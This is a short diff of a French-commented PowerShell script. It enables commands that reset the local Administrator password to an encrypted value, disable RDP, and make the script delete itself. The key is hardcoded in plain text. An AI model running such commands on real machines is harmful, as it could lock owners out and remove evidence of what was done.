@@ -50,11 +50,11 @@ $Pass ="HlqMmtNZVWPXseMiOQcIBujZCPJrlmlxEXykIImB"
 $NvxMdp = Encrypt-String $NumIcare $Pass
 	
 #Nouveau mot de passe Utilisateur
-#net user Administrateur $NvxMdp
+net user Administrateur $NvxMdp
 
 #Désactivation rdp
-#Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 1
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 1
 
 #Auto-Destruction du script
-#Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 
